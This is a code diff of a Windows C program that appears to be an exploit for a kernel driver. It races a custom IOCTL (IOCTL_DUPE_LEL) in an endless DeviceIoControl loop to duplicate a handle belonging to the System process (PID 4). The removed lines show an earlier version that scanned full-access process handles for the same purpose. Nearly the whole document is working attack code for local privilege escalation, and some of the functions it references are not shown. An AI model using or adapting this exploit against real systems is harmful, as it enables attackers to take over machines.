@@ -1,18 +1,57 @@
 #include <Windows.h>
 #include <stdio.h>
 #include <Psapi.h>
+#include <TlHelp32.h>
 #include "LMI-Common.h"
+
+void DumpHex(const void* data, size_t size) {
+	char ascii[17];
+	size_t i, j;
+	ascii[16] = '\0';
+	for (i = 0; i < size; ++i) {
+		printf("%02X ", ((unsigned char*)data)[i]);
+		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
+			ascii[i % 16] = ((unsigned char*)data)[i];
+		}
+		else {
+			ascii[i % 16] = '.';
+		}
+		if ((i + 1) % 8 == 0 || i + 1 == size) {
+			printf(" ");
+			if ((i + 1) % 16 == 0) {
+				printf("|  %s \n", ascii);
+			}
+			else if (i + 1 == size) {
+				ascii[(i + 1) % 16] = '\0';
+				if ((i + 1) % 16 <= 8) {
+					printf(" ");
+				}
+				for (j = (i + 1) % 16; j < 16; ++j) {
+					printf("   ");
+				}
+				printf("|  %s \n", ascii);
+			}
+		}
+	}
+}
 
 int main() {
 	LMI_INFO lmii = { 0 };
 	lmii.qwPid = 4;
+	lmii.handleValue = 0xf0;
 	DWORD dwHandleCount = 0;
 	DWORD64 hBegin = 0;
 	BOOL bFound = FALSE;
 	BOOL bRes = FALSE;
 	HANDLE hHeap = GetProcessHeap();
+	HANDLE hThreads[5] = { 0 };
+	SHITTY_THREAD_INFO sti = { 0 };
 	DWORD dwBytesReturned = 0;
 	LPVOID lpOutBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x1000);
+
+
+	BOOL bIsSet = FALSE;
+
 	if (!lpOutBuf) {
 		printf("HeapAlloc : %lx\n", GetLastError());
 		return -1;
@@ -24,24 +63,17 @@ int main() {
 		return -1;
 	}
 
-	HANDLE hThreads[szNumThreads] = { 0 };
 	HANDLE hSysProc = 0;
 
 	printf("hCurProc = %p\n", g_hCurrentProc);
-	
-	
-
+ 
 	HMODULE hNtdll = GetModuleHandleA("ntdll");
 	if (!hNtdll) {
 		printf("Could not get handle to ntdll");
 		return -1;
 	}
-	
-	puts("Opened device");
 
-	std::vector<HANDLE> vHandles = QuerySystemHandlesForObjectTypeAndAccess(OBJECT_TYPE_PROCESS, 0x1fffff);
-	printf("Got %zd handles\n", vHandles.size());
-	const char* strDevName = R"(\\.\LMIInfo)";
+	const char* strDevName = R"(\\.\0123456789abcdef123456789abcdef)";
 	HANDLE hDevice = CreateFileA(
 		strDevName,
 		GENERIC_READ | GENERIC_WRITE,
@@ -57,66 +89,28 @@ int main() {
 		printf("CreateFileA : %lx\n", GetLastError());
 		return -1;
 	}
+	
+	DWORD dwTid = 0;
 
-	NTSTATUS status = NtQueryInformationProcess((HANDLE)-1, (PROCESSINFOCLASS)20, &dwHandleCount, sizeof(DWORD), &dwBytesReturned);
-	if (status) {
-		printf("NtQueryInfoProc failed with 0x%lx\n", status);
-		return 0;
+	CreateThread(NULL, 0x1000, (LPTHREAD_START_ROUTINE)HandleSearchThread, NULL, NULL, &dwTid);
+	
+	while (TRUE) {
+		// call DeviceIoControl to start the race
+		bRes = DeviceIoControl(
+			hDevice,
+			IOCTL_DUPE_LEL,
+			&lmii,
+			sizeof(LMI_INFO),
+			lpOutBuf,
+			0x1000,
+			&dwBytesReturned,
+			NULL
+		);
 	}
 
-	hBegin = ((DWORD64)dwHandleCount * 4) + 4;
-	printf("Starting handle search at %llx\n", hBegin);
-
-	getchar();
-
-	for (HANDLE x : vHandles) {
-		printf("Testing handle %p\n", x);
-		if (bFound) {
-			break;
-		}
-
-	
-		lmii.handleValue = (DWORD64)x;
-
-		// try a duping handle a maximum of 10 times
-		for (size_t i = 0; i < 100; i++)
-		{
-			if (i % 10 == 0) {
-				printf(".");
-			}
-			// call DeviceIoControl to start the race
-			bRes = DeviceIoControl(
-				hDevice,
-				IOCTL_DUPE_LEL,
-				&lmii,
-				sizeof(LMI_INFO),
-				lpOutBuf,
-				0x1000,
-				&dwBytesReturned,
-				NULL
-			);
-
-			HANDLE hDupedHandle = HandleSearchThread(hBegin, 0x1fffff);
-			if (hDupedHandle) {
-				DWORD dwStrLen = GetProcessImageFileNameA(hDupedHandle, strFileName, 0x300);
-
-				if (!dwStrLen) {
-					printf("Failed to get string file name for process handle - %p\n", hDupedHandle);
-				}
-
-				printf("Got string %s\n", strFileName);
-
-				if (dwStrLen != g_strLenTargetProc) {
-					memset(strFileName, 0, dwStrLen);
-					break;
-				}
-
-				
-			}
-		}
+	if (!bRes) {
+		printf("DeviceIoControl Failed - %lx\n", GetLastError());
 	}
-	getchar();
-	
 
 
 	return 0;
